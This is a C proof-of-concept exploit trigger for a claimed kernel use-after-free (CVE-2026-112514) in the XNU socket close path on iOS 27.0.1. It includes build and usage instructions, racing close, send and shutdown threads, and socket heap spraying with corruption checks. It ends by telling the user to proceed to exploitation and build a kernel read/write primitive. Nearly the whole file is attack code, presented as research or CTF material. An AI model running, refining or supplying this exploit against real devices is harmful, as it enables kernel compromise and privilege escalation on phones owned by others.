/*
 * socket_uaf_trigger.c — CVE-2026-112514 PoC Trigger
 * Target: iOS 27.0.1 (24A446) / iPhone 16 Pro Max (A18 Pro)
 *
 * Triggers a use-after-free race condition in the XNU socket close path.
 * In iOS 27.0.1, sofree() does not atomically handle the "last reference"
 * case, allowing a concurrent TCP timer to access a socket being freed.
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -O2 -o socket_uaf_trigger socket_uaf_trigger.c -lpthread
 * Usage: ./socket_uaf_trigger [target_ip] [target_port] [iterations]
 *
 * Educational/research use only — CTF and authorized testing environments.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <signal.h>
#include <mach/mach.h>
#include <mach/mach_time.h>

#define DEFAULT_TARGET_IP   "127.0.0.1"
#define DEFAULT_TARGET_PORT 8080
#define DEFAULT_ITERATIONS  5000
#define SPRAY_SOCKETS       256
#define RACE_THREADS        4

typedef struct {
    int fd;
    volatile int *should_stop;
    volatile int *trigger_close;
    int thread_id;
} race_ctx_t;

typedef struct {
    const char *target_ip;
    int target_port;
    int iterations;
    volatile int panic_detected;
    volatile int uaf_triggered;
    int spray_fds[SPRAY_SOCKETS];
    int spray_count;
} exploit_ctx_t;

static exploit_ctx_t g_ctx;

static int
create_tcp_socket_with_timers(const char *ip, int port)
{
    int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (fd < 0) return -1;

    int val = 1;
    setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &val, sizeof(val));

    val = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPIDLE, &val, sizeof(val));

    val = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPINTVL, &val, sizeof(val));

    val = 3;
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPCNT, &val, sizeof(val));

    val = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &val, sizeof(val));

    int rcvbuf = 256 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
    int sndbuf = 256 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    struct linger lg = { .l_onoff = 1, .l_linger = 0 };
    setsockopt(fd, SOL_SOCKET, SO_LINGER, &lg, sizeof(lg));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    int flags = 1;
    ioctl(fd, FIONBIO, &flags);

    connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    return fd;
}

static void *
race_close_thread(void *arg)
{
    race_ctx_t *ctx = (race_ctx_t *)arg;

    while (!*ctx->should_stop) {
        while (!*ctx->trigger_close && !*ctx->should_stop) {
            usleep(1);
        }
        if (*ctx->should_stop) break;

        if (ctx->fd >= 0) {
            close(ctx->fd);
            ctx->fd = -1;
        }
    }
    return NULL;
}

static void *
race_send_thread(void *arg)
{
    race_ctx_t *ctx = (race_ctx_t *)arg;
    char buf[64];
    memset(buf, 'A', sizeof(buf));

    while (!*ctx->should_stop) {
        while (!*ctx->trigger_close && !*ctx->should_stop) {
            usleep(1);
        }
        if (*ctx->should_stop) break;

        if (ctx->fd >= 0) {
            send(ctx->fd, buf, sizeof(buf), MSG_DONTWAIT);
            send(ctx->fd, buf, sizeof(buf), MSG_DONTWAIT);
            shutdown(ctx->fd, SHUT_RDWR);
        }
    }
    return NULL;
}

static int
spray_replacement_sockets(void)
{
    int count = 0;
    for (int i = 0; i < SPRAY_SOCKETS; i++) {
        int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (fd < 0) break;

        int val = 0xdeadbeef;
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &val, sizeof(val));

        g_ctx.spray_fds[i] = fd;
        count++;
    }
    g_ctx.spray_count = count;
    return count;
}

static void
cleanup_spray(void)
{
    for (int i = 0; i < g_ctx.spray_count; i++) {
        if (g_ctx.spray_fds[i] >= 0) {
            close(g_ctx.spray_fds[i]);
            g_ctx.spray_fds[i] = -1;
        }
    }
    g_ctx.spray_count = 0;
}

static int
check_corruption(void)
{
    for (int i = 0; i < g_ctx.spray_count; i++) {
        int fd = g_ctx.spray_fds[i];
        if (fd < 0) continue;

        int optval = 0;
        socklen_t optlen = sizeof(optval);
        int ret = getsockopt(fd, SOL_SOCKET, SO_TYPE, &optval, &optlen);
        if (ret < 0 && errno != EBADF) {
            return 1;
        }
        if (optval != SOCK_STREAM) {
            return 1;
        }

        optval = 0;
        optlen = sizeof(optval);
        ret = getsockopt(fd, SOL_SOCKET, SO_SNDBUF, &optval, &optlen);
        if (ret == 0 && optval == 0) {
            return 1;
        }
    }
    return 0;
}

static void
run_race_iteration(int iteration)
{
    volatile int should_stop = 0;
    volatile int trigger_close = 0;

    int target_fd = create_tcp_socket_with_timers(g_ctx.target_ip, g_ctx.target_port);
    if (target_fd < 0) {
        return;
    }

    usleep(500);

    race_ctx_t close_ctx = {
        .fd = target_fd,
        .should_stop = &should_stop,
        .trigger_close = &trigger_close,
        .thread_id = 0
    };

    race_ctx_t send_ctx = {
        .fd = target_fd,
        .should_stop = &should_stop,
        .trigger_close = &trigger_close,
        .thread_id = 1
    };

    pthread_t close_thread, send_thread;
    pthread_create(&close_thread, NULL, race_close_thread, &close_ctx);
    pthread_create(&send_thread, NULL, race_send_thread, &send_ctx);

    usleep(100);
    trigger_close = 1;

    usleep(10);

    int sprayed = spray_replacement_sockets();

    usleep(100);

    if (check_corruption()) {
        fprintf(stderr, "[!] ITERATION %d: CORRUPTION DETECTED — UAF triggered!\n", iteration);
        g_ctx.uaf_triggered = 1;
    }

    should_stop = 1;
    pthread_join(close_thread, NULL);
    pthread_join(send_thread, NULL);

    cleanup_spray();

    if (close_ctx.fd >= 0) {
        close(close_ctx.fd);
    }
}

static void
run_multi_fd_race(int iteration)
{
    int fds[8];
    int active = 0;

    for (int i = 0; i < 8; i++) {
        fds[i] = create_tcp_socket_with_timers(g_ctx.target_ip, g_ctx.target_port);
        if (fds[i] >= 0) active++;
    }

    if (active < 4) {
        for (int i = 0; i < 8; i++) {
            if (fds[i] >= 0) close(fds[i]);
        }
        return;
    }

    usleep(500);

    for (int i = 0; i < 8; i += 2) {
        if (fds[i] >= 0) {
            char buf[32] = {0};
            send(fds[i], buf, sizeof(buf), MSG_DONTWAIT);
            shutdown(fds[i], SHUT_RDWR);
        }
    }

    for (int i = 0; i < 8; i += 2) {
        if (fds[i] >= 0) {
            close(fds[i]);
            fds[i] = -1;
        }
    }

    int sprayed = spray_replacement_sockets();

    usleep(50);

    for (int i = 1; i < 8; i += 2) {
        if (fds[i] >= 0) {
            char buf[32] = {0};
            int ret = send(fds[i], buf, sizeof(buf), MSG_DONTWAIT);
            if (ret < 0 && errno != EAGAIN && errno != ENOTCONN) {
                fprintf(stderr, "[!] ITERATION %d: Unexpected send error on fd %d: %s\n",
                        iteration, fds[i], strerror(errno));
            }
        }
    }

    if (check_corruption()) {
        fprintf(stderr, "[!] ITERATION %d (multi): CORRUPTION DETECTED!\n", iteration);
        g_ctx.uaf_triggered = 1;
    }

    cleanup_spray();

    for (int i = 0; i < 8; i++) {
        if (fds[i] >= 0) close(fds[i]);
    }
}

int
main(int argc, char *argv[])
{
    signal(SIGPIPE, SIG_IGN);

    g_ctx.target_ip = (argc > 1) ? argv[1] : DEFAULT_TARGET_IP;
    g_ctx.target_port = (argc > 2) ? atoi(argv[2]) : DEFAULT_TARGET_PORT;
    g_ctx.iterations = (argc > 3) ? atoi(argv[3]) : DEFAULT_ITERATIONS;
    g_ctx.panic_detected = 0;
    g_ctx.uaf_triggered = 0;

    fprintf(stderr, "=== CVE-2026-112514 Socket UAF PoC Trigger ===\n");
    fprintf(stderr, "Target:     %s:%d\n", g_ctx.target_ip, g_ctx.target_port);
    fprintf(stderr, "Iterations: %d\n", g_ctx.iterations);
    fprintf(stderr, "Strategy:   sofree/soclose reference count race\n");
    fprintf(stderr, "Spray:      %d replacement sockets per iteration\n", SPRAY_SOCKETS);
    fprintf(stderr, "================================================\n\n");

    uint64_t start = mach_absolute_time();

    for (int i = 0; i < g_ctx.iterations; i++) {
        if (g_ctx.uaf_triggered) break;

        if (i % 2 == 0) {
            run_race_iteration(i);
        } else {
            run_multi_fd_race(i);
        }

        if (i % 500 == 0 && i > 0) {
            fprintf(stderr, "[*] Progress: %d/%d iterations (%.1f%%)\n",
                    i, g_ctx.iterations, (float)i / g_ctx.iterations * 100.0);
        }
    }

    uint64_t end = mach_absolute_time();
    mach_timebase_info_data_t tbi;
    mach_timebase_info(&tbi);
    double elapsed_ms = (double)(end - start) * tbi.numer / tbi.denom / 1e6;

    fprintf(stderr, "\n=== Results ===\n");
    fprintf(stderr, "Elapsed:   %.1f ms\n", elapsed_ms);
    fprintf(stderr, "UAF:       %s\n", g_ctx.uaf_triggered ? "TRIGGERED" : "not detected (increase iterations or adjust timing)");
    fprintf(stderr, "\n");

    if (g_ctx.uaf_triggered) {
        fprintf(stderr, "[+] Socket UAF confirmed — proceed to exploitation phase.\n");
        fprintf(stderr, "    Next: spray controlled socket objects, build kR/W primitive.\n");
        return 0;
    }

    fprintf(stderr, "[-] Race not won in %d iterations.\n", g_ctx.iterations);
    fprintf(stderr, "    Try: increase iterations, adjust timer values, or use CPU load.\n");
    return 1;
}
